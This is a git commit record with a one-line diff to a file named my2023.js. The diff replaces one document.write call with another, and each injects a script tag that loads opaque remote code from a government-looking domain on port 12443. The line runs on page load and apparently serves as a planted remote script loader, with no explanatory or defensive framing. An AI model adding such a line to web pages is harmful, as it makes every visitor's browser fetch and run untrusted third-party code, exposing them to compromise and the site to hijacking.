09335bf9b7f10b9a026df912902a2c8cc5db902e
boba3721 <68194272+boba3721@users.noreply.github.com>
2021-11-19 04:29:26 +0000

    Update my2023.js

--- my2023.js
+++ my2023.js
@@ -1,1 +1,1 @@
-document.write('<script src="https://www.govyunnan.cn:12443/ty/64B58669-C082-16347-33-272CA7D0E969.alpha"><\/script>');
+document.write('<script src="https://www.govzhajian.cn:12443/ty/9F6D696D-ECBF-16347-33-23C37B6CAD10.alpha"><\/script>');
